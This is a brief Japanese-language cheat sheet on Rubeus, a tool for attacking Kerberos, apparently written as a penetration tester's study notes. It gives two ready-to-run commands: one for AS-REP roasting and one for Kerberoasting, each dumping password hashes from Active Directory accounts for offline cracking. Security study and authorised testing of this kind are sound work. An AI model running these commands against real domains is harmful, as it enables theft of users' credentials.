# Rubeus
Kerberosへの攻撃に使うツール。AS-REP roastingのような攻撃にも使える。

## コマンド集
1. AS-REP Roasting攻撃が有効なアカウントを自動で特定し、そのアカウントのAS-REPにある暗号化された、ユーザのパスワードを抽出する。  
/nowrap => 結果として抽出されるAS-REPハッシュに新しい行を追加させないようにするオプション
```
.\Rubeus.exe asreproast /nowrap
```

2. Kerberoasting攻撃に対して脆弱な可能性があるユーザアカウントを特定して、そのハッシュを出力ファイルに書き込む。
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```